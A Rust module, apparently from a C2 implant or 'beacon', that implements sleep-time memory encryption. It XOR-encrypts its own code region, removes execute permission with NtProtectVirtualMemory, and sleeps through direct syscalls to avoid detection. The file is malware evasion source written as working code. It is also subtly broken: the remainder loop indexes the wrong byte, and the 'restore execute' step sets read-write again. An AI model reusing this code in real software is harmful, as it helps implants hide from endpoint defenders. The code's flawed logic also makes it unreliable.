use core::ffi::c_void;
use core::sync::atomic::{AtomicUsize, Ordering};

use crate::core::nt;
use crate::core::types::*;
use crate::debug;

static REGION_BASE: AtomicUsize = AtomicUsize::new(0);
static REGION_SIZE: AtomicUsize = AtomicUsize::new(0);

unsafe fn xor_region(base: usize, size: usize, key: &[u8; 16]) {
    let ptr = base as *mut u8;

    // build two u64 key halves for fast 8 bytes xor
    let key_lo = u64::from_le_bytes([key[0], key[1], key[2], key[3], key[4], key[5], key[6], key[7]]);
    let key_hi = u64::from_le_bytes([key[8], key[9], key[10], key[11], key[12], key[13], key[14], key[15]]);

    let chunks = size / 16;
    let remainder = size % 16;

    // Fast path: 16 byte alignd xor
    let ptr64 = ptr as *mut u64;
    for i in 0..chunks {
        let idx = i * 2;
        *ptr64.add(idx) ^= key_lo;
        *ptr64.add(idx + 1) ^= key_hi;
    }

    // remainder bytes
    let rem_start = chunks * 16;
    for i in 0..remainder {
        *ptr.add(rem_start + 1) ^= key[i % 16];
    }
}

unsafe fn generate_xor_key() -> [u8; 16] {
    let tsc1: u64;
    let tsc2: u64;
    core::arch::asm!(
        "rdtsc",
        "shl rdx, 32",
        "or rax, rdx",
        out("rax") tsc1,
        out("rdx") _
    );
    // small delay to get different rdtsc
    for _ in 0..100u32 {
        core::hint::spin_loop();
    }
    core::arch::asm!(
        "rdtsc",
        "shl rdx, 32",
        "or rax, rdx",
        out("rax") tsc2,
        out("rdx") _
    );

    let mut key = [0u8; 16];
    let bytes1 = tsc1.to_le_bytes();
    let bytes2 = tsc2.to_le_bytes();    
    for i in 0..8 {
        key[i] = bytes1[i];
        key[i + 8] = bytes2[i];
    }

    // Ensure no zero bytes
    for b in key.iter_mut() {
        if *b == 0 {
            *b = 0x5A; // arbitrary non zeor
        }
    }

    key
}

unsafe fn plain_sleep(duration: i64) {
    let mut timeout = duration;
    let table = crate::core::ssn_table::syscall_table();
    let e = &table.ssns.nt_delay_execution;
    crate::core::invoke::syscall2(
        e.ssn, 
        e.syscall_addr as usize, 
        0usize,                             // Alertable = FALSE
        &mut timeout as *mut i64 as usize,  // DelayInterval.
    );
}

pub unsafe fn encrypted_sleep(duration: i64) {
    let base = REGION_BASE.load(Ordering::SeqCst);
    let size = REGION_SIZE.load(Ordering::SeqCst);


    if base == 0 || size == 0 {
        // no region registred so will do plain sleep
        plain_sleep(duration);
        return;
    }

    // Generate a random xor key
    let key = generate_xor_key();

    // encrypt the beacon code region
    xor_region(base, size, &key);

    // Remove execute permission
    let mut protect_base = base as *mut c_void;
    let mut protect_size = size;
    let mut old_protect: u32 = 0;

    let status = nt::nt_protect_virtual_memory(
        -1isize as HANDLE, // current process
        &mut protect_base,
        &mut protect_size,
        0x04, // PAGE_READWIRTE
        &mut old_protect,
    );

    if status != STATUS_SUCCESS {
        debug!("[SLEEP] Warning: NtProtectVirtualMmeory (RW) failed: 0x{:08X}", status);
        // decrypt and continue even if protection change failed
        xor_region(base, size, &key);
        plain_sleep(duration);
        return;
    }

    // sleep
    plain_sleep(duration);

    // resotre execute permission
    let mut protect_base = base as *mut c_void;
    let mut protect_size = size;
    let mut old_protect2: u32 = 0;

    let status = nt::nt_protect_virtual_memory(
        -1isize as HANDLE, // current process
        &mut protect_base,
        &mut protect_size,
        0x04, // PAGE_READWIRTE
        &mut old_protect2,
    );

    if status != STATUS_SUCCESS {
        debug!("[SLEEP] CRITICAL: NtProtectVirtualMemory (RX) failed: 0x{:08X}", status);
        // try anyway because we must decrypt or we crash
    }

    // decrypt
    xor_region(base, size, &key);
}

